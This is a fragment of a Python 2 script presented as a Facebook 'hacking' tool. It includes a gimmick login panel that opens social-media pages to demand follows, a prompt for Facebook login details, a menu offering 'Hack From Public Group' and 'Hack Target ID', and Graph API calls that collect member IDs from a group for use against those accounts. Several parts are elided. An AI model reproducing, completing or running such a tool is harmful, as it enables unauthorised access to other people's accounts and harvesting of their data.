...
\033[1;93m     Facebook : Rehmat Ali 
\033[1;93m     Github   : XP-XIDI
\033[1;96m XP================================================XIDI
"""
def tik():
	titik = ['.   ','..  ','... ']
...
NOOBZ LOGIN PANEL                                                                                                                                                                                                         
"""
jalan(" \033[1;96m◈===========◈   \033[1;92mWelcome to XIDI World   \033[1;96m◈===========◈")  

jalan("\033[1;91m Do everything on your own risk.")	
jalan("                         ---\033[1;92mUnknown")	
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            ...
            print "\033[1;91mAccess Denied!,\033[1;92mFollow our FB Page to get the correct password"
            os.system('xdg-open https://www.facebook.com/115242437269668e.')

    else:
        print "\033[1;91mWrong!,\033[1;92mSubcribe our Youtube Channel to get the correct username"
        os.system('xdg-open https://youtube.com/channel/UCElYTLsUjYpkBbCgu3kZd8Q')
...
def login():
	...
	try:
		...
		print('          \033[1;97m[◉] \x1b[1;96mLogin with freash new FB account \033[1;97m[◉]' )
		id = raw_input('          \033[1;97m[◉] \033[1;97mID/Email/Number \x1b[1;91m: \x1b[1;92m')
...
def super():
	...
	os.system('clear')
	print logo
	print "\x1b[1;32;40m[1] \033[1;33;40m══Hack From Public Group"
	print "\x1b[1;32;40m[2] \033[1;33;40m══Hack Target ID"
...
def pilih_super():
	...
	if peak =="":
		...
		try:
			jok = requests.get("https://graph.facebook.com/groups/?id="+idt+"&access_token="+toket)
		...
		r = requests.get("https://graph.facebook.com/groups/?id="+idt+"&access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="2":
